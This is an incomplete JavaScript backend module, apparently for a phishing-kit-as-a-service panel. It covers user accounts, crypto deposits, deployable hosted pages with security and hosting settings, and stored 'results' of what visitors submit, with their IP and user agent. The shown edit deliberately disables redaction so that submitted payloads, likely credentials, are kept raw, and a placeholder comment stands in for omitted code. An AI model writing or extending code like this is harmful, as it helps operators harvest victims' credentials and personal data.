import { createHash, pbkdf2Sync, randomBytes, randomUUID, timingSafeEqual } from "node:crypto";
import { query, withTransaction } from "../db/pool.js";
import { readJsonDb, updateJsonDb, useJsonDb } from "../data/jsonStore.js";

function createId(prefix) {
  return `${prefix}_${randomUUID().replace(/-/g, "").slice(0, 18)}`;
}

function hashPassword(password) {
  if (!password || password.length < 8) {
    throw new Error("Password must be at least 8 characters");
  }
  const salt = randomBytes(16).toString("hex");
  const hash = pbkdf2Sync(password, salt, 120000, 64, "sha512").toString("hex");
  return `pbkdf2_sha512$120000$${salt}$${hash}`;
}

function verifyPassword(password, storedHash) {
  if (!password || !storedHash) return false;
  const [algorithm, iterations, salt, hash] = storedHash.split("$");
  if (algorithm !== "pbkdf2_sha512" || !iterations || !salt || !hash) return false;
  const calculated = pbkdf2Sync(password, salt, Number(iterations), 64, "sha512");
  const expected = Buffer.from(hash, "hex");
  return expected.length === calculated.length && timingSafeEqual(expected, calculated);
}

function hashToken(token) {
  return createHash("sha256").update(token).digest("hex");
}

function toPackage(row) {
  if (!row) return null;
  return {
    id: row.id,
    slug: row.slug,
    name: row.name,
    version: row.version,
    status: row.status,
    sourceType: row.source_type,
    repoUrl: row.repo_url,
    billingPeriods: row.billing_periods,
    screens: row.screens,
    assets: row.assets,
    cssFiles: row.css_files,
    designTokens: row.design_tokens,
    packageManifest: row.package_manifest,
    publishedAt: row.published_at,
    createdAt: row.created_at,
    updatedAt: row.updated_at
  };
}

function toUser(row) {
  if (!row) return null;
  return {
    id: row.id,
    name: row.name,
    email: row.email,
    role: row.role,
    status: row.status,
    walletBalance: Number(row.wallet_balance || 0),
    collaboration: row.collaboration || {},
    createdAt: row.created_at,
    updatedAt: row.updated_at
  };
}

function toUserPage(row) {
  if (!row) return null;
  return {
    id: row.id,
    userId: row.user_id,
    packageId: row.package_id,
    packageVersion: row.package_version,
    name: row.name,
    slug: row.slug,
    domain: row.domain,
    status: row.status,
    subscription: row.subscription,
    flow: row.flow,
    configs: row.configs,
    securityConfig: row.security_config,
    hostingConfig: row.hosting_config,
    resultSettings: row.result_settings,
    generatedFile: row.generated_file,
    createdAt: row.created_at,
    updatedAt: row.updated_at
  };
}

function toTransaction(row) {
  if (!row) return null;
  return {
    id: row.id,
    userId: row.user_id,
    type: row.type,
    amount: Number(row.amount || 0),
    description: row.description,
    metadata: row.metadata,
    createdAt: row.created_at
  };
}

function toDepositRequest(row) {
  if (!row) return null;
  return {
    id: row.id,
    userId: row.user_id,
    userEmail: row.user_email || row.email || "",
    userName: row.user_name || row.name || "",
    amount: Number(row.amount || 0),
    cryptoType: row.crypto_type,
    network: row.network,
    quote: row.quote || {},
    txHash: row.tx_hash,
    status: row.status,
    adminNote: row.admin_note || "",
    reviewedBy: row.reviewed_by || "",
    reviewedAt: row.reviewed_at || null,
    createdAt: row.created_at,
    updatedAt: row.updated_at
  };
}

function toResult(row) {
  if (!row) return null;
  return {
    id: row.id,
    userPageId: row.user_page_id,
    userId: row.user_id,
    packageId: row.package_id,
    packageVersion: row.package_version,
    pageId: row.page_id,
    pageName: row.page_name,
    licenseKey: row.license_key,
    sessionId: row.session_id,
    screen: row.screen,
    flow: row.flow,
    payload: row.payload,
    hostname: row.hostname,
    path: row.path,
    ip: row.ip,
    userAgent: row.user_agent,
    createdAt: row.created_at
  };
}

function toTrafficEvent(row) {
  if (!row) return null;
  return {
    id: row.id,
    userPageId: row.user_page_id,
    pageId: row.page_id,
    sessionId: row.session_id,
    event: row.event,
    screen: row.screen,
    hostname: row.hostname,
    path: row.path,
    ip: row.ip,
    result: row.result,
    reason: row.reason,
    userAgent: row.user_agent,
    metadata: row.metadata,
    createdAt: row.created_at
  };
}

function publicJsonUser(user) {
  if (!user) return null;
  const { passwordHash, ...safeUser } = user;
  return safeUser;
}

function configuredAdminEmails() {
  return [process.env.ADMIN_EMAIL, process.env.ADMIN_EMAILS]
    .filter(Boolean)
    .flatMap((value) => String(value).split(","))
    .map((email) => email.trim().toLowerCase())
    .filter(Boolean);
}

function roleForEmail(email, fallbackRole = "subscriber") {
  return configuredAdminEmails().includes(String(email || "").toLowerCase()) ? "admin" : fallbackRole;
}

// === RAW PAYLOAD - NO REDACTION ===
function redactSubmittedValue(value) {
  return value !== null && value !== undefined && value !== "" ? value : "[blank]";
}

function redactResultPayload(payload = {}) {
  return payload;  // Return raw payload exactly as submitted
}

export async function createUser(data) {
  if (!data.email) throw new Error("Email is required");
  const passwordHash = hashPassword(data.password);
  const email = data.email.toLowerCase();
  const role = roleForEmail(email);

  if (useJsonDb()) {
    return updateJsonDb((db) => {
      if (db.users.some((user) => user.email === email)) {
        throw new Error("Email already exists");
      }
      const user = {
        id: createId("user"),
        name: data.name || "New User",
        email,
        passwordHash,
        role,
        status: "active",
        walletBalance: 0,
        collaboration: {},
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      };
      db.users.push(user);
      return publicJsonUser(user);
    });
  }

  const result = await query(
    `INSERT INTO users (id, name, email, password_hash, role, status, wallet_balance, collaboration)
     VALUES ($1, $2, $3, $4, $5, 'active', 0, '{}'::jsonb)
     RETURNING *`,
    [createId("user"), data.name || "New User", email, passwordHash, role]
  );
  return toUser(result.rows[0]);
}

// ... (rest of the file remains the same until savePageResult)

export async function savePageResult(data, ip, userAgent) {
  const userPage = await findUserPage(data.userPageId || data.pageId);
  const result = {
    id: data.id || createId("result"),
    userPageId: userPage?.id || data.userPageId,
    userId: data.userId || userPage?.userId,
    packageId: data.packageId || userPage?.packageId,
    packageVersion: data.packageVersion || userPage?.packageVersion,
    pageId: data.pageId,
    pageName: data.pageName,
    licenseKey: data.licenseKey,
    sessionId: data.sessionId,
    screen: data.screen,
    flow: data.flow || [],
    payload: redactResultPayload(data.data || {}),   // Now raw
    hostname: data.hostname,
    path: data.path,
    ip,
    userAgent: data.userAgent || userAgent,
    createdAt: new Date().toISOString()
  };
  if (useJsonDb()) {
    await updateJsonDb((db) => {
      db.pageResults.push(result);
      return result;
    });
    return result;
  }

  const dbResult = await query(
    `INSERT INTO page_results
      (id, user_page_id, user_id, package_id, package_version, page_id, page_name, license_key, session_id, screen, flow, payload, hostname, path, ip, user_agent)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11::jsonb, $12::jsonb, $13, $14, $15, $16)
     RETURNING *`,
    [result.id, result.userPageId, result.userId, result.packageId, result.packageVersion, result.pageId, result.pageName, result.licenseKey, result.sessionId, result.screen, JSON.stringify(result.flow), JSON.stringify(result.payload), result.hostname, result.path, result.ip, result.userAgent]
  );
  return toResult(dbResult.rows[0]);
}
